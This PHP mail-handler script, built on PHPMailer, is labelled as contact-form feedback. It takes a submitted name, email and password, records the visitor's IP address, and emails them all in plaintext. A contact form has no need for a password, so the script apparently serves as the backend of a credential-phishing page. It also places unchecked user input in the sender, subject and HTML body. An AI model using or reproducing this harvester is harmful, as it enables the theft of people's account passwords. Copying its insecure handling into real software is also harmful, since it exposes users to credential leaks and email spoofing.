<?php

require('phpmailer/class.phpmailer.php');
require('phpmailer/class.smtp.php');

/* config start */
$emailAddress = $_POST['email']; // 'your Email here. I set entered email to test ';
$fromName = "example company";
$smtp = false;

/* NOTE: IF YOU RECEIVED THIS MESSAGE "Error Occurred: Could not instantiate mail function." YOU SHOULD SET SMTP CONFIG
 * AND SET $SMTP VALUE TO TRUE */
/* config end */

$email = $_POST['email'];
if (isset($_POST['password'])) {
    $password = $_POST['password'];
    $msg = 'Name: ' . $_POST['name'] . '<br />
Email: ' . $_POST['email'] . '<br />
IP: ' . $_SERVER['REMOTE_ADDR'] . '<br /><br />
Password:<br /><br />
' . $password . '
';
} else {
    $msg = 'Email: ' . $_POST['email'] . '<br />
IP: ' . $_SERVER['REMOTE_ADDR'] . '<br /><br />
';
}

$mail = new PHPMailer(); // create an object of the class

if ($smtp) {
    $mail->IsSMTP();
    $mail->Host = "smtp.gmail.com";
    $mail->SMTPSecure = "ssl";
    $mail->Port = 465;

    // optional
    // used only when SMTP requires authentication  
    $mail->SMTPAuth = true;
    $mail->Username = 'GMAIL USERNAME';
    $mail->Password = 'YOUR GMAIL PASSWORD';
}

$mail->Timeout = 360;
$mail->Subject = "A new mail from " . $_POST['email'] . " | contact form feedback";
$mail->From = $email;
$mail->FromName = $email;
$mail->AddReplyTo($emailAddress, $fromName);
$mail->AddAddress($emailAddress, '');
$mail->MsgHTML($msg);
$mail->Body = $msg;

if ($mail->Send()) {
    echo "<div class='alert alert-success'>Your Message Sent!</div>";
} else {
    echo "<div class='alert alert-error'>Error Occurred: " . $mail->ErrorInfo . "</div>";
}

?>